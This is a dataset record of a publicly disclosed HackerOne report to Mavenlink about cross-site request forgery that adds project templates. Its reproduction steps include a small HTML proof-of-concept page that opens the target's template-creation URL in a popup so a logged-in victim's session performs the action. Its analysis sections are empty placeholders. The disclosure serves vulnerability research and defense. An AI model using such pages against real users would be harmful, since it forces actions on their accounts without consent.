---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '301919'
original_report_id: '301919'
title: CSRF Add user templates
weakness: Cross-Site Request Forgery (CSRF)
team_handle: mavenlink
created_at: '2018-01-03T09:04:03.740Z'
disclosed_at: '2019-02-27T23:39:23.847Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 16
tags:
- hackerone
- cross-site-request-forgery-csrf
---

# CSRF Add user templates

## Metadata

- HackerOne Report ID: 301919
- Weakness: Cross-Site Request Forgery (CSRF)
- Program: mavenlink
- Disclosed At: 2019-02-27T23:39:23.847Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

Reproduction:
==========

- Log in to account
- Visit CSRF page below (note default 30 seconds timeout, can be adjusted according to the connection speed): 

```
<!doctype html>
<html>
<head>
</head> 
<body>
<script>
var a = window.open("https://app.mavenlink.com/project_templates#new", "csrf", "height=100,width=100"); 
var intervalID = setTimeout(function () { a.close();}, 30000); 
</script>
</body>
</html>
```

## Impact

CSRF Add user templates

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
